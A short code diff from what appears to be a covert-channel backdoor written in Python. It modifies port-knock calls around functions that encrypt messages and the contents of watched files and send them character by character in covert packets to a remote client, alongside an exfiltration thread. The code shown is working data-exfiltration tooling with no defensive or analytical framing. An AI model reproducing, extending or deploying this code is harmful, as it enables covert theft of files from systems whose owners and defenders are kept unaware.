@@ -53,13 +53,13 @@ def addWatch(target, address, proto):
 
 def sendMessage(string):
 	recvFunctions.knockCode(client, protocol, True)
-	
+
 	string = utils.encryptData(string)
 	for c in string:
 		send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
 
-	recvFunctions.knockCode(client, protocol, True)
+	recvFunctions.knockCode(client, protocol, False)
 
 def removeWatch(target):
 	if (wama.rm_watch(wama.get_wd(target))):
@@ -76,7 +76,7 @@ def sendFile(target):
 			c = utils.encryptData(c)
 			send(utils.covertPacket(client, protocol, c, recvFunctions.pswd), verbose=0)
 
-	recvFunctions.knockCode(client, protocol, True)
+	recvFunctions.knockCode(client, protocol, False)
 
 def exfilThread():
 	noti.loop()
